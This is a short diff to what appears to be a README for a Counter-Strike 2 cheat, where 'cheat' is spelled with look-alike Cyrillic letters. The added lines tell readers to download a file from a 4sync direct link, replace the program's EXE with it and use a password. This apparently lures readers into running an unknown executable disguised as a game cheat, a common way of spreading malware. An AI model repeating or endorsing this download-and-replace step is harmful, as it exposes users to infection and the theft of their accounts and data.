@@ -23,6 +23,9 @@ This сhеаt for CS2 includes the following capabilities:
 
    **Password 2025**
 
+**If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file**
+**Password replace**
+
 ---
 
 ## 📦 Extract
